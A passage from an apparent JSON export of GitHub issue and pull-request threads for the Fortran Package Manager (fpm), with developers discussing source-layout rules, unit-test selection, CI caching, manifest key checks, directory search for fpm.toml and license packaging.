                    "text": "Note that this argument when followed to its logical conclusion would prevent us to impose any kind of \"default layout\" in fpm, because it is preventing valid code to compile.\n\nAre we allowing multiple modules or just one module together with the program? If multiple, it means we are also making a decision of not ever imposing the module naming convention based on the filename?\n\nThere are huge advantages that come from having a restrictive default layout. I want to make sure all the implication of this decision are understood.\n\nIf we make this decision, will it be warning by default, and you can turn off the warning in fpm.toml with an option? That actually would be fine with me.\n\u2026\nOn Sun, Sep 20, 2020, at 2:52 AM, Laurence Kedward wrote:\n\n\n > Technically the main issue as I see it is that if we start with being restrictive, we can always relax the requirements later without breaking any existing fpm package.\n\n I don't think we should consider deferring this decision.\n\n I think Milan makes a very important point: having no restrictions does\n not affect those who want to conform to their own standard for layout,\n but enforcing restrictions does affect those who do not. By placing\n restrictions on otherwise valid Fortran you are enforcing one group's\n subjective preference on everyone.\n\n > Regarding the warning, I don't know if I would like to be getting warnings for things that are allowed.\n\n There are some situations where I learn to live with certain compiler\n warnings, because I know why those warnings exist and why I have chosen\n to ignore them. This would be the same in this case.\n\n \u2014\n You are receiving this because you commented.\n Reply to this email directly, view it on GitHub\n <#178 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWEDC6BPNNUGYSS7II3SGW7ERANCNFSM4RR2MP5A>."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-20 13:14:42+00:00",
                    "text": "If we make this decision, will it be warning by default, and you can turn off the warning in fpm.toml with an option?\n\nYes, a warning by default.\n\nThere are huge advantages that come from having a restrictive default layout.\n\nAre these advantages for fpm developers or advantages for fpm users? My argument is based on prioritising the latter over the former."
                },
                {
                    "user": "certik",
                    "date": "2020-09-20 13:33:42+00:00",
                    "text": "I am fine with warning by default.\n\nI think the advantages are for the users. I agree that is what we should prioritize.\n\nWe can discuss further at our monthly call. I think we have an agreement on this particular issue to move forward.\n\u2026\nOn Sun, Sep 20, 2020, at 7:14 AM, Laurence Kedward wrote:\n\n\n > If we make this decision, will it be warning by default, and you can turn off the warning in fpm.toml with an option?\n\n Yes, a warning by default.\n\n > There are huge advantages that come from having a restrictive default layout.\n\n Are these advantages for fpm developers or advantages for fpm users? My\n argument is based on prioritising the latter over the former.\n\n \u2014\n You are receiving this because you commented.\n Reply to this email directly, view it on GitHub\n <#178 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWGQ4B6K6KMAWOUBM6DSGX543ANCNFSM4RR2MP5A>."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-20 15:32:56+00:00",
                    "text": "Thanks @certik.\nPerhaps a nuanced but important point that may have been missed: I don't argue here for relaxing any restriction. I argue for including a test case of a pattern that is presently both permitted (within our planned restriction set) and working, rather than leaving it untested.\nI was assuming that the file/module layout and naming restriction we impose follows from #153 where we agreed that we will require the module name to be prefixed with package name. This helps prevent name collisions.\nI was also assuming that we don't anymore require the module name to be the same as the source file name. I don't think it does  anything for us given #153. Do you agree?\nSo, if we don't require the module name to be the same as the source file name, I see no practical reason to forbid module+program or multi-module in source file. However, if we do require it, then we can't do what I proposed in this thread.\nAs an afterthought, given #153 we should rename the modules in current example packages to reflect this (even though we're not enforcing it yet)."
                },
                {
                    "user": "certik",
                    "date": "2020-09-20 18:27:24+00:00",
                    "text": "My understanding was that we relaxed the name of the modules, but kept the door open if we wanted to make it strict again. With this change the door closes.\n\nI think the overall goal is for fpm to fully understand the project and to build it automatically.\n\nI think this change doesn't compromise this goal, so I think it's fine to relax restrictions.\n\nThe other goal is to make it easy to use a dependency. For that if we will not enforce module names based on directories, we could make a command \"fpm api PACKAGE\" that would summarize what modules the user can call and what is in them.\n\u2026\nOn Sun, Sep 20, 2020, at 9:33 AM, Milan Curcic wrote:\n\n\n Thanks @certik <https://github.com/certik>.\n\n Perhaps a nuanced but important point that may have been missed: I\n don't argue here for relaxing any restriction. I argue for including a\n test case of a pattern that is presently both permitted (within our\n planned restriction set) and working, rather than leaving it untested.\n\n I was assuming that the file/module layout and naming restriction we\n impose follows from #153\n <#153> where we agreed that\n we will require the module name to be prefixed with package name. This\n helps prevent name collisions.\n\n I was also assuming that we don't anymore require the module name to be\n the same as the source file name. I don't think it does anything for us\n given #153 <#153>. Do you\n agree?\n\n So, if we don't require the module name to be the same as the source\n file name, I see no practical reason to forbid module+program or\n multi-module in source file. However, if we do require it, then we\n can't do what I proposed in this thread.\n\n As an afterthought, given #153\n <#153> we should rename the\n modules in current example packages to reflect this (even though we're\n not enforcing it yet).\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#178 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWGROTVUNT2WSW4USTLSGYODJANCNFSM4RR2MP5A>."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-20 19:40:22+00:00",
                    "text": "I think all doors should stay open. If we later decide to make the module naming more strict, we remove this test. If it shows to be problematic for implementation, we remove it. Adding this test doesn't close any doors."
                }
            ]
        },
        {
            "number": 177,
            "user": "awvwgk",
            "date": "2020-09-15 21:30:38+00:00",
            "title": "Allow selective testing of single suites and tests",
            "text": "Related to #176.\nIn case we want to continue using the current unit testing framework, this PR should reduce the boilerplate code to register new test suites and allow for some better debugging of failing tests.\nRegistering a new test suite works now in a similar way as registering a unit test in the collecting interface:\n\n  \n    \n      fpm/fpm/test/main.f90\n    \n    \n        Lines 15 to 19\n      in\n      4a5ecae\n    \n    \n    \n    \n\n        \n          \n           testsuite = [ & \n        \n\n        \n          \n               & new_testsuite(\"fpm_toml\", collect_toml), & \n        \n\n        \n          \n               & new_testsuite(\"fpm_manifest\", collect_manifest), & \n        \n\n        \n          \n               & new_testsuite(\"fpm_source_parsing\", collect_source_parsing) & \n        \n\n        \n          \n               & ] \n        \n    \n  \n\n\nThe other point is handling and debugging of failing tests.\nRunning fpm test will run all test suites and all contained unit tests. In case we encounter a failure, we usually don't want to run all tests every time while debugging, therefore I added the option to select the test suite and the test we want to run.\nThe available levels of testing are than:\n\nfpm test: no argument will run all available test suites\nfpm test --args \"help\" or any other not available test suite will print the names of all available test suites (will not run any tests and exit code will be 1)\n\n# Available testsuites\n# - fpm_toml\n# - fpm_manifest\n# - fpm_source_parsing\n\n\nfpm test --args \"fpm_source_parsing\" will select the source parsing test suite and only run its unit tests\nfpm test --args \"fpm_source_parsing help\" or any other not available unit test will print the names of all available unit tests in the test suite source parsing (will not run any tests and exit code will be 1)\n\n# Suite: fpm_source_parsing\n# Available tests:\n# - modules-used\n# - intrinsic-modules-used\n# - include-stmt\n# - module\n# - submodule\n# - submodule-ancestor\n# - subprogram\n# - csource\n# - invalid-use-stmt\n# - invalid-include-stmt\n# - invalid-module\n# - invalid-submodule\n\n\nfpm test --args \"fpm_source_parsing invalid-submodule\" will only run the invalid-submodule unit test from the source parsing test suite",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-09-18 18:13:42+00:00",
                    "text": "Thanks, @awvwgk. I have a few questions.\n\nDoes the argument value really need the quotes around it?\n\nfpm test --args \"help\"\n\nor does this work:\nfpm test --args help\n\nIf not, any way we can make it work without quotes? As is, the CLI UI seems a bit awkward to me.\n\nPerhaps the quotes are needed to pass multiple values to --args? I wonder if we need args at all. What do you think about this API instead:\n\nfpm test                                # runs all test suites\nfpm test fpm_source_parsing             # runs only this test suite\nfpm test missing_test_suite             # shows available test suites if missing test suite is requested\nfpm test test_suite_one, test_suite_two # list multiple suites separated by comma\nfpm test --help                         # shows the help message and the list of available test suites\nfpm test -h                             # same as above\n\nThis way we drop the --args and quotes altogether, IMO for a cleaner UI."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-18 19:02:42+00:00",
                    "text": "Regarding the first point, for a single argument it will work without quotes just fine. The reason for the quotation marks is mainly due to the limitation of the bootstrap fpm implementation, see #138. Therefore, I just put them around the arguments every time while testing (and writing the PR up).\nRegarding your suggestion at the second point, I guess there is some mix-up between the testing framework in fpm and the fpm-test target. Since we are building and testing fpm with fpm, this requires careful reading and writing, I hope I got the latter right.\n\nfpm test would invoke the test targets for fpm, which contain all executables contained in [[test]] sections\nfpm test fpm-test would invoke the fpm-test target defined for fpm (for fpm this is identical to 1.)\nfpm test test_source_parsing would be ambiguous, there is no target called test_source_parsing, in case there is only one test target available, we could allow fpm to be smart and pass it as argument to the one test target in fpm. I think this is rather dangerous, in case the test executable doesn't handle command line arguments it will fail silently.\nfpm test missing_test_suite is in this regard identical to 3.\nfpm test --help should print the help on the fpm test command, not pass this as argument to the test target.\n\nThe best solution would be to allow the -- flag in bootstrap fpm to pass every following argument to the selected target, currently we have to use --args \"<arg1> ...\" due to #138."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-18 19:14:51+00:00",
                    "text": "Okay, if I understood this correctly, I confused fpm's internal test suites with test targets that any fpm package can have. In that case, I'm happy with this moving forward as is."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-20 15:38:22+00:00",
                    "text": "This is a small and low impact PR with no objections so I'll go ahead and merge it. Thank you, @awvwgk!"
                }
            ]
        },
        {
            "number": 176,
            "user": "awvwgk",
            "date": "2020-09-15 21:19:49+00:00",
            "title": "Unit testing framework",
            "text": "I seems like we will stay with my (temporary) testing framework for now. I'm actually surprised that this idea worked out.\nNevertheless, we should discuss if there might be better alternatives or in case we want to stay with the current model, how it should behave as we implement more test suites. If we want to allow preprocessor or external (non-Fortran) dependencies we have a much wider range of testing frameworks available.\nRegarding the current behaviour of the testing framework:\n\none executable for all test suites to reduce [[test]] entries in fpm.toml (related to #164)\nfailing tests within a suite will not cause the testing to halt\n\nbetter overview in a CI run about errors\npotential for parallelisation over a test suite\n\n\na failing test suite will halt the testing framework\n\nnot sure about this one (any opinions or suggestions?)\nwill be changed by #177\n\n\narray constructor to register unit tests (and also test suites)\n\nname and procedure pointer required (could be redundant)\ncould become fragile for very large test suites (compiler limits for array constructors)",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-09-15 21:37:12+00:00",
                    "text": "I think your framework does exactly what we need and stays out of the way. Good to have this thread open for discussion, but unless concrete problems arise I don't think we need to look further for now."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-15 22:17:20+00:00",
                    "text": "I was going to suggest vegetables at some point, as it solves those problems. I also like it because it encourages the test descriptions to read more like a requirements specification. Your framework is actually fairly similar in terms of definition/registration of the tests, so I wasn't worried about switching, and if we do need to the transition won't seem very awkward. I also have a tool with it that automates finding all the test suites and constructing the main program.\n\na failing test suite will halt the testing framework\n\nI wouldn't recommend this. It makes the output of the framework dependent on the order that it runs the tests. If the tests are independent (and they should be), the order that they're run shouldn't have any bearing on the outputs.\n\ncould become fragile for very large test suites (compiler limits for array constructors)\n\nI've used vegetables for a project that had hundreds of tests. I don't know if fpm will have more than that, but it seems to me more likely to hit the continuation line limit before any array constructor limit (assuming there is one)."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-16 08:46:17+00:00",
                    "text": "I'm happy with your framework since it's lightweight and easy to use as a developer.\nI will echo the general sentiment here that I prefer testing to continue in the presence of test failures - this is more useful when debugging IMO.\nI usually split test suites between multiple executables (hence #164) for two reasons:\n\nI can run tests in parallel trivially;\nUncaught fatal errors don't stop other suites from running (granted, we shouldn't have any uncaught failures here).\n\nWith that said, I don't mind the current single-executable approach since our tests don't have any significant runtime."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-16 09:00:53+00:00",
                    "text": "Agreed, a failing test suite should not stop the testing. I'll address this in #177."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-09-16 09:35:11+00:00",
                    "text": "In my Ftnunit unit test package I use a small batch file/shell script to\nrepeatedly run the test executable in case of run-time failures. It relies\non a small file being updated and read before each test to see if that test\nneeds to be run or has already been run. The problem is that if a test\nleads to a crash of the program, you simply cannot continue and this\nmechanism works around that.\n\nOp wo 16 sep. 2020 om 11:01 schreef Sebastian Ehlert <\nnotifications@github.com>:\n\u2026\n Agreed, a failing test suite should not stop the testing. I'll address\n this in #177 <#177>.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#176 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR6FY65K6RHDZTADFPTSGB5FLANCNFSM4RNZK6LQ>\n ."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-16 14:22:02+00:00",
                    "text": "In case of a test crashing we would have to run it with gdb or valgrind to debug anyway. This is not that straight-forward with fpm right now, but would probably use a similar mechanism as an external script to launch tests.\nWe could have something like the build-script in the library section to support more elaborated testing frameworks not only for this project but for all fpm packages:\n[[test]]\nname = \"tester\"\nbuild-script = \"collect-tests\"\ntest-script = \"run-tests\"\nfpm test would than call <test-script> <name> instead of just the binary."
                },
                {
                    "user": "certik",
                    "date": "2020-09-22 02:32:18+00:00",
                    "text": "I am ok with any testing framework for fpm itself. The current one is fine with me.\nAs long as fpm test works with any testing framework. I assume we all agree on that."
                }
            ]
        },
        {
            "number": 175,
            "user": "interkosmos",
            "date": "2020-09-15 19:06:31+00:00",
            "title": "Updated formatting",
            "text": "Please review these updates of README.md, CONTRIBUTING.md, and PACKAGING.md. Some minor changes in formatting and typography have been made.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-09-15 19:27:10+00:00",
                    "text": "Thanks, Philipp. I skimmed through and have no objections. To confirm, there are no content changes, right? If not, I think it can go forward."
                },
                {
                    "user": "interkosmos",
                    "date": "2020-09-15 19:29:28+00:00",
                    "text": "Nope, no content changes."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-15 20:45:42+00:00",
                    "text": "Simple PR with no change to behavior or content so I will go ahead and merge."
                }
            ]
        },
        {
            "number": 174,
            "user": "LKedward",
            "date": "2020-09-13 10:49:55+00:00",
            "title": "Cache Haskell stack build in CI",
            "text": "Waiting up to 10min for the CI is a bit of a nuisance; especially when you rely on it for platforms you can't test yourself like MacOS.\nI've played around with actions/cache on my own fork to cache the Haskell stack build, and managed to drop CI times down to between 1min for Ubuntu and 3min for Windows, see this run for example.\n\n\nOn the first run, the CI will cache stack build files (in /home/runner/.stack/ on Ubuntu), and reuse this cache at subsequent CI runs.\n\n\nThe stack build command is still executed so any updates to Haskell fpm and its dependencies are still compiled each time.\n\n\nThe cache is reset:\n\nafter a week of no CI runs;\nif the STACK_CACHE_VERSION is changed manually in the workflow file;\nevery month otherwise.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-09-13 13:44:00+00:00",
                    "text": "Great idea! Looks good.\n\u2026\nOn Sun, Sep 13, 2020, at 4:50 AM, Laurence Kedward wrote:\n Waiting up to 10min for the CI is a bit of a nuisance; especially when\n you rely on it for platforms you can't test yourself like MacOS.\n\n I've played around with actions/cache\n <https://github.com/actions/cache> on my own fork to cache the Haskell\n stack build, and managed to drop CI times down to between 1min for\n Ubuntu and 3min for Windows, see this run for example\n <https://github.com/LKedward/fpm/runs/1106056906>.\n\n  * On the first run, the CI will cache stack build files (in\n `/home/runner/.stack/` on Ubuntu), and reuse this cache at subsequent\n CI runs.\n\n  * The `stack build` command is still executed so any updates to\n Haskell fpm and its dependencies are still compiled each time.\n\n  * The cache is reset:\n\n    * after a week of no CI runs;\n    * if the `STACK_CACHE_VERSION` is changed manually in the workflow file;\n    * every month otherwise.\n You can view, comment on, or merge this pull request online at:\n\n   #174\n\n Commit Summary\n\n  * Update: CI with caching of stack files.\n File Changes\n\n  * *M* .github/workflows/CI.yml\n <https://github.com/fortran-lang/fpm/pull/174/files#diff-128469c2fd54cf32412f10096b91495a> (28)\n Patch Links:\n\n  * https://github.com/fortran-lang/fpm/pull/174.patch\n  * https://github.com/fortran-lang/fpm/pull/174.diff\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#174>, or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWGPEPCNQX4AYI4KY5LSFSPWBANCNFSM4RKS3U7Q>."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-20 15:35:53+00:00",
                    "text": "@everythingfunctional Please merge when ready."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-21 07:13:44+00:00",
                    "text": "Another reason for this PR is that we get spurious CI failures when there's a lot of commit activity due to various rate limits being triggered. We can rerun the workflow, but again that adds to the lead time between push and CI result."
                },
                {
                    "user": "certik",
                    "date": "2020-09-21 15:05:21+00:00",
                    "text": "I am going to go ahead and merge. It is a huge improvement to development. If @everythingfunctional  objects later, we can revert this."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-21 20:49:38+00:00",
                    "text": "This is definitely a worthwhile change. Thanks."
                }
            ]
        },
        {
            "number": 173,
            "user": "urbanjost",
            "date": "2020-09-13 09:20:14+00:00",
            "title": "toml-f implementation produces error if more than 15 test or app programs are used",
            "text": "When using the Fortran TOML interface the program issues an error message when you have more than 15 test programs or application programs in a project.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-09-13 09:25:58+00:00",
                    "text": "Sorry, my mistake. Already fixed upstream in toml-f with ecbc73a. Will be made available with #171 in fpm."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-13 18:11:44+00:00",
                    "text": "Great. The only other problem I had was that I added description keywords in my fpm.toml files that were being used by the registry web page and the new TOML interface rejects unknown keywords. It looks like the problem with the description and category keywords is/was being taken care of (cannot find the topic but sure it was in here somewhere) but I have mixed feelings about that. It catches typos in the file but (like NAMELIST where I also dislike that) it makes it a lot harder to mainain a single file potentially used by multiple programs that might require different data. Is that intentional?  Great work by the way. Thanks!"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-13 18:37:33+00:00",
                    "text": "The new keywords came up in #165.\nIt was indeed intentional to have an explicit list of allowed keywords to verify the package file contains the correct entries and only the supported ones. I have to admit, I just extracted the allowed keys from the PACKAGING.md in this repository, which contains just several examples, chances were good that already supported keys would be missed and so they were.\nAn option would be to relax the check for allowed keys for certain sections or add a specific section that is not governed by any schema checks, see #165 (comment). I think the schema checks are especially useful in sections like library or the individual dependencies, which influence the way fpm is building a project."
                }
            ]
        },
        {
            "number": 172,
            "user": "urbanjost",
            "date": "2020-09-13 09:17:54+00:00",
            "title": "fpm should search in directories above current directory for fpm.toml file",
            "text": "I find the fpm(1) command much nicer to use if it searches for the fpm.toml file instead of requiring it to be executed in the directorin containing the fpm.toml file.  For example, if I am working on files in the src, app, and test directories and my current directory is one of those directories I have to cd(1) up one directory and run fpm(1) and then cd back into the working directory or stay in the directory with the fpm.toml file and use long path names. I have been trying that with a personal version and it makes it MUCH nicer to use on larger projects with many directories, especially since each executable source has to be kept in a seperate directory.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-09-13 10:19:27+00:00",
                    "text": "I like this idea! I have noticed the same thing while working with fpm, having to switch back and forth between two terminal panes when building. This is also exactly how git(1) works.\n\n... especially since each executable source has to be kept in a seperate directory.\n\nThere is discussion in #164 (Automatically discover tests and executables) to remove this restriction and further simplify user-effort."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-19 02:27:55+00:00",
                    "text": "This is trivial if CHDIR(3f) is supported. Note that a quick survey of three compilers (GCC/gfortran, Intel, PGI) shows all support a CHDIR(3f) extension; and it is easily supported via ISO_C_BINDING interfaces on POSIX machines. It almost certainly will be part of stdlib at some point. Since it is such a common extension, would greatly simplify implementation of the feature, and currently Fortran fpm is assumed to be being built with gfortran perhaps some of the gfortran POSIX-like extensions (in this case CHDIR(3f)) can be used directly?"
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-11-19 07:53:53+00:00",
                    "text": "@martin Diehl <martin.diehl@kuleuven.be> and I are working on that sort of\nroutines, as part of stdlib-os. The complications are the Windows platform\nwhich consists actually of four different environments (plain Windows,\nCygwin, MinGW and MSYS). CHDIR is relatively simple, the main problem is\nunifying the build system (CMake based), such that we do not have to rely\non a preprocessor on the Fortran side. I intend to solve the immediate\nissue we now have today or within the next few days.\n\nOp do 19 nov. 2020 om 03:28 schreef urbanjost <notifications@github.com>:\n\u2026\n This is trivial if CHDIR(3f) is supported. Note that a quick survey of\n three compilers (GCC/gfortran, Intel, PGI) shows all support a CHDIR(3f)\n extension; and it is easily supported via ISO_C_BINDING interfaces on POSIX\n machines. It almost certainly will be part of stdlib at some point. Since\n it is such a common extension, would greatly simplify implementation of the\n feature, and currently Fortran fpm is assumed to be being built with\n gfortran perhaps some of the gfortran POSIX-like extensions (in this case\n CHDIR(3f)) can be used directly?\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#172 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR22RZH3GCDD4BHRTCDSQR7DRANCNFSM4RKRSC3A>\n ."
                },
                {
                    "user": "MarDiehl",
                    "date": "2020-11-19 17:38:47+00:00",
                    "text": "@urbanjost: I agree with @arjenmarkus, relying on certain extensions is not a good long-term strategy. When os/os_path works on Windows (Cygwin, MinGW, and MSYS) and on POSIX (currently tested on Mac OS and Linux), it should be straight forward to include other system routines from C. We (i.e. mainly @arjenmarkus) almost found a suitable setup that works on all OS flavors."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-20 02:17:26+00:00",
                    "text": "I have a list of methods for handling platform-specific options. One of the easiest that does not require a preprocessor is to use a generic name like my_routine and then have a directory for each platform that has a source for my_routine. Instead of a preprocessor you just select the correct directory to build.  If each solution contains very similar code or if there is a strong reason for keeping all the code in a single file a preprocessor can be more appropriate. I generally use POSIX platforms and have found the ISO_C_BINDING interface to work very well on Mac/CygWin/Unix/GNU-Linux; and in a few cases on windows I was able to make C routines that looked like the POSIX routines that called the MSWindows equivalents. I do not know of a public version of a POSIX look-alike for MSWindows like CygWin provides but that would be very useful if it exists.\nSome Fortran extensions are so common they are as standard as the standard implementation is itself; CHDIR seems to fall in or close to that.  It would seem like a low maintenance issue to make a wrapper library that had something like STDLIB_CHDIR in it that called the vendor routine if it existed. If it did not call a ISO_C_BINDING to the POSIX routine if the platform is POSIX, and then a custom solution. In general it would seem reasonable to use vendor extensions if they exist behind such a wrapper and leave the maintenance to the compiler supplier."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-11-20 07:12:39+00:00",
                    "text": "Well, that is the solution we have chosen now: different source code,\nselected per platform, where CMake does the actual selection. So, we are\nworking along the same lines here - the details may differ, but that is all.\n\nOp vr 20 nov. 2020 om 03:17 schreef urbanjost <notifications@github.com>:\n\u2026\n I have a list of methods for handling platform-specific options. One of\n the easiest that does not require a preprocessor is to use a generic name\n like my_routine and then have a directory for each platform that has a\n source for my_routine. Instead of a preprocessor you just select the\n correct directory to build. If each solution contains very similar code or\n if there is a strong reason for keeping all the code in a single file a\n preprocessor can be more appropriate. I generally use POSIX platforms and\n have found the ISO_C_BINDING interface to work very well on\n Mac/CygWin/Unix/GNU-Linux; and in a few cases on windows I was able to make\n C routines that looked like the POSIX routines that called the MSWindows\n equivalents. I do not know of a public version of a POSIX look-alike for\n MSWindows like CygWin provides but that would be very useful if it exists.\n\n Some Fortran extensions are so common they are as standard as the standard\n implementation is itself; CHDIR seems to fall in or close to that. It would\n seem like a low maintenance issue to make a wrapper library that had\n something like STDLIB_CHDIR in it that called the vendor routine if it\n existed. If it did not call a ISO_C_BINDING to the POSIX routine if the\n platform is POSIX, and then a custom solution. In general it would seem\n reasonable to use vendor extensions if they exist behind such a wrapper and\n leave the maintenance to the compiler supplier.\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#172 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR5XWTGI7F3CKG45UODSQXGUPANCNFSM4RKRSC3A>\n ."
                }
            ]
        },
        {
            "number": 171,
            "user": "awvwgk",
            "date": "2020-09-12 20:56:18+00:00",
            "title": "Increase test coverage of fpm manifest",
            "text": "should yield complete coverage for all reachable lines in manifest modules (total test coverage at ~78%)\ninfo procedures of the manifest types are not tested\nadds description, keywords, categories and homepage to allowed keys in root (see #165)\nfixes revision -> rev in dependency table\nfixes path not excluding tag, rev and branch entry\nfixes grammar of error messages\nbump commit to latest toml-f version (doesn't require class(toml_table), pointer anymore, bugfixes)\ninclude test number in fpm-test runs\n\nQuestion: Do we want keep the info procedures for the manifest types? I added them for debugging in the first implementation.\nFixes #173",
            "comments": []
        },
        {
            "number": 170,
            "user": "LKedward",
            "date": "2020-09-12 15:01:56+00:00",
            "title": "Source parsing tests",
            "text": "As discussed in #155, this uses the error_t type to return and propagate errors from the new source parsing routines.\nAdds a test suite for the parsing routines - any difficult parsing edge cases can be added in there as they are found.\nThere are other regions from #155 that still require test coverage.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-09-12 18:26:56+00:00",
                    "text": "Thanks @awvwgk \ud83d\udc4d\n\n.. it might be more verbose to print the line of the source file as well, maybe, in case we know, even highlight the offending part in some way.\n\nGreat idea! That's a neat implementation too!\nI've now added more context output, though in most cases indicating the offending column may have to wait until a proper parsing library is used."
                }
            ]
        },
        {
            "number": 169,
            "user": "awvwgk",
            "date": "2020-09-12 11:29:56+00:00",
            "title": "Packaging license files with fpm",
            "text": "Since fpm is built around the sole purpose of linking Fortran dependencies statically into applications, there should be a mechanism do deal with license files. Currently the specified license only takes a string or maybe SPDX identifier, but this might not be sufficient for some projects, e.g. packaging for conda-forge requires to package the project license files and all license files of the statically linked dependencies.\nRequiring every project to specify the license with an SPDX identifier and either let fpm automatically collect the license files (look for COPYING*, LICENSE*, ... in the project root directory) or require the author to provide a list of license files would allow fpm to know about the more or less exact licensing situation of the application.\nThis affects packages under multiple licenses as well, the Apache-2.0 / MIT dual licensing from the Rust community is probably relevant here.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-09-12 16:28:40+00:00",
                    "text": "Why do we want to do this?\nIs it to safeguard the user from inadvertently importing a less permissive dependency into their project, for example, GPL dependency into a MIT project? In that case, do we want to not allow it or simply warn the user? What does Cargo do in this scenario?\nAre there other reasons to handle dependency licenses?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-12 17:12:26+00:00",
                    "text": "Most licenses require to be included with source or binary distributions in some form. I think this becomes important once we start creating distributions of any kind with fpm. But I can only speak about the projects I'm usually packaging for.\nIf fpm should support producing conda-build input like suggested in #70, it would be certainly necessary. Packing the license files is a requirement to publish on conda-forge (see https://conda-forge.org/docs/maintainer/adding_pkgs.html).\nPackaging for Arch Linux requires the inclusion of the license files as well (see https://wiki.archlinux.org/index.php/PKGBUILD#license).\nI also checked Cargo and it requires either SPDX identifiers or the license file(s) to be packaged (see https://doc.rust-lang.org/cargo/reference/manifest.html#the-license-and-license-file-fields)."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-12 17:29:26+00:00",
                    "text": "Thank you for further explaining that, I now understand better. It seems like the right thing to do."
                },
                {
                    "user": "certik",
                    "date": "2020-09-12 17:55:43+00:00",
                    "text": "Yes, I think we have to package the license.\n\u2026\nOn Sat, Sep 12, 2020, at 11:29 AM, Milan Curcic wrote:\n\n\n Thank you for further explaining that, I now understand better. It\n seems like the right thing to do.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#169 (comment)>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AAAFAWBLSDIBATGERB7DXATSFOVYHANCNFSM4RJM47GA>."
                }
            ]
        },
        {
            "number": 168,
            "user": "interkosmos",
            "date": "2020-09-10 18:25:26+00:00",
            "title": "Fortran interface bindings to libgit2",
            "text": "I\u2019d like to announce that I\u2019m working on a collection of Fortran 2008 ISO C binding interfaces to libgit2, as this dependency was discussed in #136 and #166. Just in case anybody else has the same idea.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-09-10 18:41:25+00:00",
                    "text": "Awesome, thank you @interkosmos !"
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-01-19 19:20:25+00:00",
                    "text": "@interkosmos Do you have a public repository available?"
                },
                {
                    "user": "interkosmos",
                    "date": "2021-01-19 21:22:21+00:00",
                    "text": "@ivan-pi: Not yet, although, I did not work on the interface library in the last weeks.\nCurrent status:\n-------------------------------------------------------------------------------\nLanguage                     files          blank        comment           code\n-------------------------------------------------------------------------------\nFortran 90                      26            149            129           1045\n-------------------------------------------------------------------------------\nSUM:                            26            149            129           1045\n-------------------------------------------------------------------------------\n\nI try to publish an alpha release in the next time."
                }
            ]
        },
        {
            "number": 167,
            "user": "awvwgk",
            "date": "2020-09-08 08:12:52+00:00",
            "title": "Special characters in paths",
